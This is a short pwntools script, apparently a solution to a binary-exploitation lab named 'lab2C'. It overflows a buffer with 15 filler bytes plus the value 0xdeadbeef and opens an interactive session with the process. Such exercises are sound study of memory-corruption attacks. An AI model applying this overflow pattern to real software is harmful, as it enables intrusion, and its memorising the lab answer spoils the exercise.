from pwn import *

# 0xdeadbeef
payload = "A" * 15 + p32(0xdeadbeef) # "\xef\xbe\xad\xde"
io = process(['lab2C',payload])
io.interactive()
